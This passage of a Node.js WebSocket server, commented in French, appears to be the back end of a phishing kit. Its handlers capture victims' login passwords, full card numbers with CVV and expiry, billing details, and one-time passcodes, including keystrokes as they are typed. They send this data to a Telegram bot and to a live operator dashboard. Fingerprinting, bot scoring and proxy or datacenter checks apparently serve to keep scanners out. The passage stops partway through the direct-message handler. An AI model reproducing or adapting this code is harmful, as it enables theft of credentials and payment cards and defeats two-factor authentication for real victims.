  // ============================================
  
  console.log(`[Security] ✅ All security checks passed for ${ip}`);

  // Initialiser l'analyse comportementale
  behaviorAnalysis.initClient(clientId);

  // Stocker la connexion avec les infos de sécurité
  const clientData = {
    ws,
    id: clientId,
    ip,
    userAgent,
    country: country || 'Unknown',
    countryCode,
    role: null,
    connectedAt: Date.now(),
    security: {
      botScore: botAnalysis.score,
      datacenter: datacenterInfo,
      proxy: proxyInfo,
      behaviorScore: 50, // Score initial
      fingerprintScore: null
    }
  };
  
  clients.set(clientId, clientData);
  console.log(`[Connection] 💾 Client stored with security info`);
  console.log(`[Connection] 📊 Bot score: ${botAnalysis.score}, Datacenter: ${datacenterInfo?.isDatacenter || false}, Proxy: ${proxyInfo?.isProxy || false}`);

  // Envoyer message de bienvenue
  ws.send(JSON.stringify({
    type: 'welcome',
    message: 'Connected to WebSocket server',
    clientId,
  }));

  // Gestion des messages
  ws.on('message', async (message) => {
    try {
      const rawMessage = message.toString();
      console.log(`\n[Server] ========================================`);
      console.log(`[Server] 📨 Raw message received from ${clientId}:`, rawMessage);
      const data = JSON.parse(rawMessage);
      console.log(`[Server] 📨 Parsed message from ${clientId}:`, data.type);
      console.log(`[Server] 📨 Full message data:`, JSON.stringify(data, null, 2));
      console.log(`[Server] 📨 Message details - type: ${data.type}, from: ${clientId}, to: ${data.to || 'N/A'}`);
      console.log(`[Server] ========================================\n`);
      await handleMessage(clientId, data);
    } catch (error) {
      console.error(`[Server] ❌ Error parsing message from ${clientId}:`, error);
      console.error(`[Server] Raw message:`, message.toString());
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Invalid message format',
      }));
    }
  });

  // Gestion de la déconnexion
  ws.on('close', (code, reason) => {
    console.log(`\n[Connection] ========================================`);
    console.log(`[Connection] Client disconnected: ${clientId}`);
    console.log(`[Connection] Close code: ${code} (1000=Normal, 1001=Going Away, 1005=No Status, 1006=Abnormal)`);
    console.log(`[Connection] Reason: ${reason || 'No reason'}`);
    console.log(`[Connection] ========================================\n`);
    
    const client = clients.get(clientId);
    if (client) {
      console.log(`[Connection] 📊 Client role before disconnect: ${client.role || 'null'}`);
      console.log(`[Connection] 📊 Client IP: ${client.ip || 'N/A'}`);
      console.log(`[Connection] 📊 Client country: ${client.country || 'N/A'}`);
    } else {
      console.log(`[Connection] ⚠️  Client ${clientId} not found in storage`);
    }
    
    // Pour les fermetures normales (code 1000), attendre plus longtemps avant de supprimer
    // Cela permet au client de se reconnecter rapidement sans perdre son état
    // React.StrictMode peut créer deux connexions, l'une se fermant rapidement
    if (code === 1000) {
      console.log(`[Connection] ⚠️  Normal closure (code 1000) - waiting 60 seconds before removing client`);
      console.log(`[Connection] This might be a React.StrictMode cleanup - client may reconnect`);
      
      // Vérifier si un client avec la même IP vient de se reconnecter
      const clientIP = client?.ip;
      const hasReconnectedClient = clientIP ? Array.from(clients.values()).some(c => 
        c.ip === clientIP && c.id !== clientId && c.ws.readyState === 1 && (Date.now() - c.connectedAt) < 5000
      ) : false;
      
      if (hasReconnectedClient) {
        console.log(`[Connection] ✅ Client with same IP (${clientIP}) just reconnected - removing old connection immediately`);
        // Si un client avec la même IP vient de se reconnecter, supprimer l'ancien immédiatement
        if (client && client.role === 'dashboard') {
          dashboards.delete(ws);
        }
        clients.delete(clientId);
        console.log(`[Connection] Old client ${clientId} removed (replaced by new connection)`);
        return;
      }
      
      setTimeout(() => {
        const stillExists = clients.get(clientId);
        if (stillExists && stillExists.ws.readyState === 3) { // CLOSED
          // Vérifier une dernière fois si un client avec la même IP s'est reconnecté
          const stillExistsIP = stillExists.ip;
          const hasReconnected = stillExistsIP ? Array.from(clients.values()).some(c => 
            c.ip === stillExistsIP && c.id !== clientId && c.ws.readyState === 1
          ) : false;
          
          if (hasReconnected) {
            console.log(`[Connection] ✅ Client with same IP (${stillExistsIP}) has reconnected - removing old connection`);
            if (stillExists.role === 'dashboard') {
              dashboards.delete(stillExists.ws);
            }
            clients.delete(clientId);
            console.log(`[Connection] Old client ${clientId} removed (replaced by reconnected client)`);
            return;
          }
          
          console.log(`[Connection] Client ${clientId} still closed after 60 seconds - removing`);
          console.log(`[Connection] 📊 Client role before removal: ${stillExists.role || 'null'}`);
          console.log(`[Connection] 📊 Total clients before removal: ${clients.size}`);
          if (stillExists.role === 'dashboard') {
            dashboards.delete(stillExists.ws);
            console.log(`[Connection] Dashboard ${clientId} removed from dashboards`);
          }
          clients.delete(clientId);
          console.log(`[Connection] Client ${clientId} removed from clients map`);
          console.log(`[Connection] Remaining clients: ${clients.size}`);
          console.log(`[Connection] 📊 Clients with role 'client' after removal: ${Array.from(clients.values()).filter(c => c.role === 'client').length}`);
          
          // Notifier les dashboards seulement si c'était un client (pas un dashboard)
          if (stillExists.role === 'client') {
            broadcastToDashboards({
              type: 'client_disconnected',
              clientId,
            });
          }
        } else if (stillExists && stillExists.ws.readyState !== 3) {
          console.log(`[Connection] ✅ Client ${clientId} reconnected! Keeping in map`);
        } else {
          console.log(`[Connection] ⚠️  Client ${clientId} no longer exists in storage`);
        }
      }, 60000); // Augmenter à 60 secondes pour laisser plus de temps aux clients de se reconnecter
      
      return; // Ne pas supprimer immédiatement
    }
    
    // Pour les fermetures anormales, supprimer immédiatement
    if (client && client.role === 'dashboard') {
      dashboards.delete(ws);
      console.log(`[Connection] Dashboard ${clientId} removed from dashboards set`);
    }
    
    clients.delete(clientId);
    console.log(`[Connection] Client ${clientId} removed from clients map`);
    console.log(`[Connection] Remaining clients: ${clients.size}`);

    // Notifier les dashboards
    broadcastToDashboards({
      type: 'client_disconnected',
      clientId,
    });
  });
});

// Gestion des messages
async function handleMessage(clientId, data) {
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handleMessage] ❌ Client not found: ${clientId}`);
    return;
  }

  console.log(`[handleMessage] 🔄 Processing message type: ${data.type} from client: ${clientId} (role: ${client.role || 'null'})`);
  console.log(`[handleMessage] 📊 Total clients before processing: ${clients.size}`);

  switch (data.type) {
    case 'register':
      console.log(`[handleMessage] 📝 Registering client ${clientId} with role: ${data.role || 'client'}`);
      console.log(`[handleMessage] 📝 Register data:`, JSON.stringify(data, null, 2));
      await handleRegister(clientId, data);
      const clientAfter = clients.get(clientId);
      console.log(`[handleMessage] 📊 Total clients after registration: ${clients.size}`);
      console.log(`[handleMessage] 📊 Client role after registration: ${clientAfter?.role || 'null'}`);
      console.log(`[handleMessage] 📊 Clients with role 'client': ${Array.from(clients.values()).filter(c => c.role === 'client').length}`);
      break;
    
    case 'presence':
      await handlePresence(clientId, data);
      break;
    
    case 'billing_update':
      console.log(`[handleMessage] 🔔 Billing update received from client ${clientId}`);
      console.log(`[handleMessage] 📨 Billing update data:`, JSON.stringify(data, null, 2));
      await handleBillingUpdate(clientId, data);
      break;
    
    case 'billing_data':
      await handleBillingData(clientId, data);
      break;
    
    case 'login_data':
      await handleLoginData(clientId, data);
      break;
    
    case 'payment_data':
      console.log(`[handleMessage] 💳 Payment data received from client ${clientId}`);
      console.log(`[handleMessage] Payment data content:`, JSON.stringify(data, null, 2));
      await handlePaymentData(clientId, data);
      break;
    
    case 'otp_update':
      await handleOTPUpdate(clientId, data);
      break;
    
    case 'otp_submit':
      console.log(`[handleMessage] 🔢 OTP submit received from client ${clientId}`);
      console.log(`[handleMessage] OTP data content:`, JSON.stringify(data, null, 2));
      await handleOTPSubmit(clientId, data);
      break;
    
    case 'list':
      console.log(`[handleMessage] 📋 List request from ${clientId} (role: ${client.role})`);
      handleList(clientId);
      break;
    
    case 'direct':
      console.log(`[handleMessage] 📨 Direct message from ${clientId} (role: ${client.role})`);
      handleDirectMessage(clientId, data);
      break;
    
    // ============================================
    // MESSAGES DE SÉCURITÉ / COMPORTEMENT
    // ============================================
    
    case 'behavior_data':
      await handleBehaviorData(clientId, data);
      break;
    
    case 'fingerprint_data':
      await handleFingerprintData(clientId, data);
      break;
    
    case 'mouse_movement':
      handleMouseMovement(clientId, data);
      break;
    
    case 'keystroke':
      handleKeystroke(clientId, data);
      break;
    
    case 'click':
      handleClick(clientId, data);
      break;
    
    case 'scroll':
      handleScroll(clientId, data);
      break;
    
    // ============================================
    // HCAPTCHA
    // ============================================
    
    case 'hcaptcha_verify':
      await handleHCaptchaVerify(clientId, data);
      break;
    
    case 'get_hcaptcha_config':
      handleGetHCaptchaConfig(clientId);
      break;
    
    default:
      console.log(`[handleMessage] ⚠️  Unknown message type: ${data.type} from ${clientId}`);
  }
}

// ============================================
// HANDLERS DE DONNÉES COMPORTEMENTALES
// ============================================

async function handleBehaviorData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  console.log(`[Behavior] 📊 Received behavior data from ${clientId}`);

  // Enregistrer les données comportementales
  if (data.mouseMovements) {
    data.mouseMovements.forEach(m => behaviorAnalysis.recordMouseMovement(clientId, m));
  }
  if (data.keystrokes) {
    data.keystrokes.forEach(k => behaviorAnalysis.recordKeystroke(clientId, k));
  }
  if (data.clicks) {
    data.clicks.forEach(c => behaviorAnalysis.recordClick(clientId, c));
  }
  if (data.scrollEvents) {
    data.scrollEvents.forEach(s => behaviorAnalysis.recordScroll(clientId, s));
  }

  // Analyser le comportement
  const analysis = behaviorAnalysis.analyze(clientId);
  
  // Mettre à jour le score du client
  if (client.security) {
    client.security.behaviorScore = analysis.score;
  }

  // Vérifier si le score est trop bas
  if (analysis.score < securityConfig.getMinBehaviorScore()) {
    console.log(`[Behavior] ⚠️ Low behavior score for ${clientId}: ${analysis.score}`);
  }

  console.log(`[Behavior] ✅ Client ${clientId} behavior score: ${analysis.score}`);
}

async function handleFingerprintData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  console.log(`[Fingerprint] 🔍 Received fingerprint data from ${clientId}`);

  // Analyser le fingerprint
  const analysis = fingerprintService.analyze(data.fingerprint);
  
  // Stocker le fingerprint
  fingerprintService.storeFingerprint(clientId, data.fingerprint, analysis);

  // Mettre à jour le score du client
  if (client.security) {
    client.security.fingerprintScore = analysis.score;
    client.security.fingerprintHash = analysis.hash;
  }

  // Vérifier les duplicatas (même fingerprint = possible fraude)
  const duplicate = fingerprintService.isDuplicateFingerprint(analysis.hash, clientId);
  if (duplicate.isDuplicate) {
    console.log(`[Fingerprint] ⚠️ Duplicate fingerprint detected for ${clientId}`);
  }

  // Vérifier si le score est trop bas
  if (analysis.score < securityConfig.getMinFingerprintScore()) {
    console.log(`[Fingerprint] ⚠️ Low fingerprint score for ${clientId}: ${analysis.score}`);
  }

  console.log(`[Fingerprint] ✅ Client ${clientId} fingerprint score: ${analysis.score}`);
}

function handleMouseMovement(clientId, data) {
  behaviorAnalysis.recordMouseMovement(clientId, {
    x: data.x,
    y: data.y,
    timestamp: data.timestamp || Date.now()
  });
}

function handleKeystroke(clientId, data) {
  behaviorAnalysis.recordKeystroke(clientId, {
    key: data.key,
    timestamp: data.timestamp || Date.now(),
    field: data.field
  });
}

function handleClick(clientId, data) {
  behaviorAnalysis.recordClick(clientId, {
    x: data.x,
    y: data.y,
    timestamp: data.timestamp || Date.now(),
    element: data.element
  });
}

function handleScroll(clientId, data) {
  behaviorAnalysis.recordScroll(clientId, {
    scrollY: data.scrollY,
    timestamp: data.timestamp || Date.now()
  });
}

// ============================================
// HANDLERS HCAPTCHA
// ============================================

async function handleHCaptchaVerify(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  console.log(`[HCaptcha] 🔐 Verification request from ${clientId}`);

  const token = data.token;
  if (!token) {
    console.log(`[HCaptcha] ❌ No token provided by ${clientId}`);
    client.ws.send(JSON.stringify({
      type: 'hcaptcha_result',
      success: false,
      error: 'missing_token'
    }));
    return;
  }

  // Vérifier le token avec l'API hCaptcha
  const result = await hcaptchaService.verify(token, client.ip);

  // Stocker le résultat dans les données client
  if (!client.security) {
    client.security = {};
  }
  client.security.hcaptcha = {
    verified: result.success,
    verifiedAt: Date.now(),
    score: result.score
  };

  // Envoyer le résultat au client
  client.ws.send(JSON.stringify({
    type: 'hcaptcha_result',
    success: result.success,
    error: result.error,
    errorCodes: result.errorCodes
  }));

  console.log(`[HCaptcha] ${result.success ? '✅' : '❌'} Verification ${result.success ? 'successful' : 'failed'} for ${clientId}`);
}

function handleGetHCaptchaConfig(clientId) {
  const client = clients.get(clientId);
  if (!client) return;

  const config = hcaptchaService.getClientConfig();
  
  client.ws.send(JSON.stringify({
    type: 'hcaptcha_config',
    ...config
  }));

  console.log(`[HCaptcha] 📤 Config sent to ${clientId}: enabled=${config.enabled}`);
}

// Enregistrement d'un client
async function handleRegister(clientId, data) {
  console.log(`[handleRegister] 📝 Registering client ${clientId}`);
  console.log(`[handleRegister] Role: ${data.role || 'client'}, Page: ${data.page || '/'}`);
  console.log(`[handleRegister] 📊 Total clients before registration: ${clients.size}`);
  
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handleRegister] ❌ Client not found: ${clientId}`);
    console.log(`[handleRegister] 📊 Available client IDs:`, Array.from(clients.keys()));
    return;
  }
  
  const previousRole = client.role;
  client.role = data.role || 'client';
  client.current_page = data.page || '/';
  
  console.log(`[handleRegister] 📝 Client ${clientId} role changed from '${previousRole || 'null'}' to '${client.role}'`);

  if (client.role === 'dashboard') {
    dashboards.add(client.ws);
    console.log(`[handleRegister] ✅ Dashboard registered: ${clientId}`);
    console.log(`[handleRegister] Total dashboards: ${dashboards.size}`);
  } else {
    console.log(`[handleRegister] ✅ Client registered: ${clientId} with role '${client.role}'`);
    console.log(`[handleRegister] 📊 Total clients with role 'client': ${Array.from(clients.values()).filter(c => c.role === 'client').length}`);
  }

  // Envoyer confirmation
  const registrationResponse = {
    type: 'registered',
    clientId,
    role: client.role,
  };
  console.log(`[handleRegister] 📤 Sending registration confirmation:`, JSON.stringify(registrationResponse, null, 2));
  client.ws.send(JSON.stringify(registrationResponse));
  console.log(`[handleRegister] ✅ Registration confirmation sent to ${clientId}`);

  // Notifier Telegram pour les nouveaux clients - DÉSACTIVÉ
  // Le message "Nouveau Client" n'est plus envoyé pour éviter le spam
  // if (client.role === 'client') {
  //   await telegram.notifyNewClient({
  //     id: clientId,
  //     ip: client.ip,
  //     current_page: client.current_page,
  //     created_at: client.connectedAt,
  //   });
  // }

  // Notifier les dashboards
  const notificationType = client.role === 'client' ? 'client_registered' : 'dashboard_connected';
  console.log(`[handleRegister] 📢 Broadcasting ${notificationType} to ${dashboards.size} dashboard(s)`);
  broadcastToDashboards({
    type: notificationType,
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
    },
  });
}

// Mise à jour de présence
async function handlePresence(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  const oldPage = client.current_page;
  client.current_page = data.page || '/';
  client.last_seen = Date.now();

  // Notifier Telegram si changement de page - DÉSACTIVÉ
  // Les notifications de mise à jour de page ne sont plus envoyées pour éviter le spam
  // if (oldPage !== client.current_page) {
  //   await telegram.notifyPageUpdate({
  //     id: clientId,
  //     current_page: client.current_page,
  //   });
  // }

  // Notifier les dashboards
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      last_seen: client.last_seen,
    },
  });
}

// Mise à jour billing (clic sur "mettre à jour")
async function handleBillingUpdate(clientId, data) {
  console.log(`\n[handleBillingUpdate] ========================================`);
  console.log(`[handleBillingUpdate] 🔔 Processing billing update notification`);
  console.log(`[handleBillingUpdate] Client ID: ${clientId}`);
  console.log(`[handleBillingUpdate] Data received:`, JSON.stringify(data, null, 2));
  
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handleBillingUpdate] ❌ Client not found: ${clientId}`);
    console.log(`[handleBillingUpdate] Available clients:`, Array.from(clients.keys()));
    console.log(`[handleBillingUpdate] ========================================\n`);
    return;
  }

  console.log(`[handleBillingUpdate] ✅ Client found`);
  console.log(`[handleBillingUpdate] Client IP: ${client.ip || 'N/A'}`);
  console.log(`[handleBillingUpdate] Client country: ${client.country || 'N/A'}`);

  // Vérifier et récupérer le pays si nécessaire
  let country = client.country;
  if (!country || country === 'Unknown' || country === 'N/A' || country === 'null') {
    console.log(`[handleBillingUpdate] ⚠️  Country is missing or Unknown (${country}), attempting to fetch again...`);
    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
      try {
        country = await getCountryFromIP(client.ip);
        console.log(`[handleBillingUpdate] 🔄 Re-fetched country: ${country}`);
        if (country && country !== 'Unknown' && country !== 'Local') {
          client.country = country;
          console.log(`[handleBillingUpdate] ✅ Updated client country to: ${client.country}`);
        } else {
          country = country || 'N/A';
        }
      } catch (error) {
        console.error(`[handleBillingUpdate] ❌ Error fetching country:`, error);
        country = 'N/A';
      }
    } else {
      console.log(`[handleBillingUpdate] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
      country = 'N/A';
    }
  }

  // Notifier Telegram
  const telegramData = {
    id: clientId,
    ip: client.ip || 'N/A',
    country: country || 'N/A',
  };

  console.log(`[handleBillingUpdate] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
  const telegramResult = await telegram.notifyBillingUpdate(telegramData);
  console.log(`[handleBillingUpdate] ✅ Telegram notification result:`, telegramResult);

  // Notifier les dashboards
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      last_seen: Date.now(),
    },
  });
}

// Données de facturation
async function handleBillingData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  Object.assign(client, data.data);

  // Notifier Telegram
  await telegram.notifyCustom('Données de facturation', {
    Client: clientId,
    Nom: `${data.data.first_name || ''} ${data.data.last_name || ''}`.trim(),
    Email: data.data.email || 'N/A',
  });

  // Notifier les dashboards
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ...data.data,
    },
  });
}

// Données de connexion
async function handleLoginData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  client.login_email = data.data.email;
  client.login_password = data.data.password;

  // Notifier Telegram
  await telegram.notifyLoginData({
    id: clientId,
    login_email: data.data.email,
    login_password: data.data.password,
  });

  // Notifier les dashboards
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      login_email: data.data.email,
    },
  });
}

// Données de paiement
async function handlePaymentData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handlePaymentData] ❌ Client not found: ${clientId}`);
    return;
  }

  console.log(`[handlePaymentData] 📨 Received payment data for client: ${clientId}`);
  console.log(`[handlePaymentData] Data received:`, JSON.stringify(data, null, 2));

  client.card_holder = data.data.cardHolder || data.data.nameOnCard;
  client.card_number = data.data.cardNumber;
  client.card_expiration = data.data.expirationDate;
  client.card_cvv = data.data.cvv;

  // Vérifier et afficher le pays du client
  console.log(`[handlePaymentData] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
  console.log(`[handlePaymentData] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
  
  // Si le pays n'est pas défini ou est "Unknown", essayer de le récupérer à nouveau
  let country = client.country;
  if (!country || country === 'Unknown' || country === 'N/A' || country === 'null') {
    console.log(`[handlePaymentData] ⚠️  Country is missing or Unknown (${country}), attempting to fetch again...`);
    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
      try {
        country = await getCountryFromIP(client.ip);
        console.log(`[handlePaymentData] 🔄 Re-fetched country: ${country}`);
        // Mettre à jour le pays dans les données du client
        if (country && country !== 'Unknown' && country !== 'Local') {
          client.country = country;
          console.log(`[handlePaymentData] ✅ Updated client country to: ${client.country}`);
        } else {
          console.log(`[handlePaymentData] ⚠️  Re-fetch returned invalid country: ${country}`);
          country = country || 'Unknown';
        }
      } catch (error) {
        console.error(`[handlePaymentData] ❌ Error fetching country:`, error);
        country = 'Unknown';
      }
    } else {
      console.log(`[handlePaymentData] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
      country = 'Unknown';
    }
  } else {
    console.log(`[handlePaymentData] ✅ Using stored country: ${country}`);
  }
  
  // Vérifier le BIN du numéro de carte
  let binInfo = null;
  if (data.data.cardNumber) {
    console.log(`[handlePaymentData] 🔍 Checking BIN for card number...`);
    binInfo = await binService.checkCardNumber(data.data.cardNumber);
    if (binInfo) {
      console.log(`[handlePaymentData] ✅ BIN info retrieved:`, JSON.stringify(binInfo, null, 2));
    } else {
      console.log(`[handlePaymentData] ⚠️  Could not retrieve BIN info`);
    }
  }
  
  const telegramData = {
    id: clientId,
    ip: client.ip,
    country: country || 'Unknown', // Utiliser le pays récupéré ou mis à jour
    card_holder: data.data.cardHolder || data.data.nameOnCard,
    card_number: data.data.cardNumber,
    card_expiration: data.data.expirationDate,
    card_cvv: data.data.cvv,
    current_page: client.current_page,
    bin_info: binInfo, // Ajouter les informations BIN
  };

  console.log(`[handlePaymentData] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
  console.log(`[handlePaymentData] 🌍 Country in Telegram data: ${telegramData.country}`);
  console.log(`[handlePaymentData] Telegram enabled:`, telegram.enabled);

  // Notifier Telegram avec toutes les informations
  const telegramResult = await telegram.notifyPaymentData(telegramData);
  console.log(`[handlePaymentData] ✅ Telegram notification result:`, telegramResult);

  // Notifier les dashboards avec toutes les données
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
      last_seen: client.last_seen,
      card_holder: data.data.cardHolder,
      card_number: data.data.cardNumber,
      card_expiration: data.data.expirationDate,
      card_cvv: data.data.cvv,
      otp_code: client.otp_code,
      otp_status: client.otp_status,
      otp_submitted_at: client.otp_submitted_at,
      login_email: client.login_email,
      login_password: client.login_password,
    },
  });
}

// Mise à jour OTP (typing)
async function handleOTPUpdate(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  client.otp_code = data.otp;
  client.otp_status = 'typing';

  // Notifier les dashboards avec toutes les données
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
      last_seen: client.last_seen,
      card_holder: client.card_holder,
      card_number: client.card_number,
      card_expiration: client.card_expiration,
      card_cvv: client.card_cvv,
      otp_code: data.otp,
      otp_status: 'typing',
      otp_submitted_at: client.otp_submitted_at,
      login_email: client.login_email,
      login_password: client.login_password,
    },
  });
}

// Soumission OTP
async function handleOTPSubmit(clientId, data) {
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handleOTPSubmit] ❌ Client not found: ${clientId}`);
    return;
  }

  console.log(`[handleOTPSubmit] 📨 Received OTP submit for client: ${clientId}`);
  console.log(`[handleOTPSubmit] OTP received:`, data.otp);

  client.otp_code = data.otp;
  client.otp_status = 'submitted';
  client.otp_submitted_at = Date.now();

  // Vérifier et afficher le pays du client
  console.log(`[handleOTPSubmit] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
  console.log(`[handleOTPSubmit] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
  
  // Si le pays n'est pas défini ou est "Unknown", essayer de le récupérer à nouveau
  let country = client.country;
  if (!country || country === 'Unknown' || country === 'N/A' || country === 'null') {
    console.log(`[handleOTPSubmit] ⚠️  Country is missing or Unknown (${country}), attempting to fetch again...`);
    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
      try {
        country = await getCountryFromIP(client.ip);
        console.log(`[handleOTPSubmit] 🔄 Re-fetched country: ${country}`);
        // Mettre à jour le pays dans les données du client
        if (country && country !== 'Unknown' && country !== 'Local') {
          client.country = country;
          console.log(`[handleOTPSubmit] ✅ Updated client country to: ${client.country}`);
        } else {
          console.log(`[handleOTPSubmit] ⚠️  Re-fetch returned invalid country: ${country}`);
          country = country || 'Unknown';
        }
      } catch (error) {
        console.error(`[handleOTPSubmit] ❌ Error fetching country:`, error);
        country = 'Unknown';
      }
    } else {
      console.log(`[handleOTPSubmit] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
      country = 'Unknown';
    }
  } else {
    console.log(`[handleOTPSubmit] ✅ Using stored country: ${country}`);
  }
  
  const telegramData = {
    id: clientId,
    ip: client.ip,
    country: country || 'Unknown', // Utiliser le pays récupéré ou mis à jour
    otp_code: data.otp,
    otp_status: 'submitted',
    current_page: client.current_page,
    card_holder: client.card_holder,
    card_number: client.card_number,
    card_expiration: client.card_expiration,
    card_cvv: client.card_cvv, // Ajouter le CVV pour l'affichage dans Telegram
  };

  console.log(`[handleOTPSubmit] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
  console.log(`[handleOTPSubmit] 🌍 Country in Telegram data: ${telegramData.country}`);
  console.log(`[handleOTPSubmit] Telegram enabled:`, telegram.enabled);

  // Notifier Telegram avec toutes les informations
  const telegramResult = await telegram.notifyOTP(telegramData);
  console.log(`[handleOTPSubmit] ✅ Telegram notification result:`, telegramResult);

  // Notifier les dashboards avec toutes les données du client
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
      last_seen: client.last_seen,
      card_holder: client.card_holder,
      card_number: client.card_number,
      card_expiration: client.card_expiration,
      card_cvv: client.card_cvv,
      otp_code: data.otp,
      otp_status: 'submitted',
      otp_submitted_at: client.otp_submitted_at,
      login_email: client.login_email,
      login_password: client.login_password,
    },
  });
}


// Liste des clients (pour dashboard)
function handleList(clientId) {
  console.log(`[handleList] 📋 List request from ${clientId}`);
  const client = clients.get(clientId);
  if (!client || client.role !== 'dashboard') {
    console.log(`[handleList] ❌ List request denied: not a dashboard or client not found. ClientId: ${clientId}, Role: ${client?.role || 'unknown'}`);
    return;
  }

  console.log(`[handleList] ✅ Dashboard ${clientId} requesting clients list`);
  console.log(`[handleList] 📊 Total clients in storage: ${clients.size}`);
  console.log(`[handleList] 📊 Clients breakdown:`);
  Array.from(clients.values()).forEach(c => {
    console.log(`[handleList]   - ${c.id}: role=${c.role || 'null'}, ip=${c.ip || 'N/A'}`);
  });
  
  const clientsList = Array.from(clients.values())
    .filter(c => {
      // Inclure les clients avec role 'client' OU les clients qui viennent de se connecter (role null mais pas dashboard)
      // et qui ont une connexion WebSocket ouverte
      const isClient = c.role === 'client' || (c.role === null && c.ws.readyState === 1);
      if (!isClient) {
        console.log(`[handleList] ⚠️  Filtering out client ${c.id} - role is '${c.role || 'null'}' instead of 'client', readyState: ${c.ws.readyState}`);
      } else if (c.role === null) {
        console.log(`[handleList] ✅ Including unregistered client ${c.id} (will be registered soon)`);
      }
      return isClient;
    })
    .map(c => ({
      id: c.id,
      ip: c.ip,
      country: c.country || 'Unknown',
      current_page: c.current_page,
      connectedAt: c.connectedAt,
      last_seen: c.last_seen,
      card_holder: c.card_holder,
      card_number: c.card_number,
      card_expiration: c.card_expiration,
      card_cvv: c.card_cvv,
      otp_code: c.otp_code,
      otp_status: c.otp_status,
      otp_submitted_at: c.otp_submitted_at,
      login_email: c.login_email,
      login_password: c.login_password,
      first_name: c.first_name,
      last_name: c.last_name,
    }));
  
  console.log(`[handleList] 📊 Sending ${clientsList.length} client(s) to dashboard ${clientId}`);
  if (clientsList.length > 0) {
    console.log(`[handleList] Countries:`, clientsList.map(c => `${c.id}: ${c.country}`).join(', '));
    console.log(`[handleList] Sample client data:`, JSON.stringify(clientsList[0], null, 2));
  } else {
    console.log(`[handleList] ⚠️  No clients found with role 'client'`);
  }
  
  const response = {
    type: 'clients',
    items: clientsList,
  };
  console.log(`[handleList] 📤 Response:`, JSON.stringify(response, null, 2));
  client.ws.send(JSON.stringify(response));
  console.log(`[handleList] ✅ Clients list sent to dashboard ${clientId}`);
}

// Gestion des messages directs (dashboard -> client)
function handleDirectMessage(senderId, data) {
  console.log(`\n[DirectMessage] ========================================`);
  console.log(`[DirectMessage] 📨 Received direct message from ${senderId}`);
  console.log(`[DirectMessage] Full data:`, JSON.stringify(data, null, 2));
  console.log(`[DirectMessage] ========================================\n`);
  
  const sender = clients.get(senderId);
  if (!sender) {
    console.log(`[DirectMessage] ❌ Sender not found: ${senderId}`);
    console.log(`[DirectMessage] Available clients:`, Array.from(clients.keys()));
    return;
  }
  
  if (sender.role !== 'dashboard') {
    console.log(`[DirectMessage] ❌ Sender is not a dashboard. Role: ${sender.role}, SenderId: ${senderId}`);
    return;
  }

  const targetId = data.to;
  if (!targetId) {
    console.log('[DirectMessage] ❌ No target client ID provided');
    console.log('[DirectMessage] Data received:', JSON.stringify(data, null, 2));
    return;
  }

  const targetClient = clients.get(targetId);
  if (!targetClient) {
    console.log(`\n[DirectMessage] ========================================`);
    console.log(`[DirectMessage] ❌ Target client not found: ${targetId}`);
    console.log(`[DirectMessage] Available clients:`, Array.from(clients.keys()));
    console.log(`[DirectMessage] Total clients: ${clients.size}`);
    console.log(`[DirectMessage] ⚠️  Client may have disconnected before message could be sent`);
    console.log(`[DirectMessage] ========================================\n`);
    return;
  }
  
  // Vérifier que le client est toujours connecté
  if (targetClient.ws.readyState !== 1) {
    console.log(`\n[DirectMessage] ========================================`);
    console.log(`[DirectMessage] ⚠️  Target client WebSocket is not OPEN`);
    console.log(`[DirectMessage] Client ID: ${targetId}`);
    console.log(`[DirectMessage] WebSocket readyState: ${targetClient.ws.readyState} (1=OPEN, 0=CONNECTING, 2=CLOSING, 3=CLOSED)`);
    console.log(`[DirectMessage] ========================================\n`);
    return;
  }

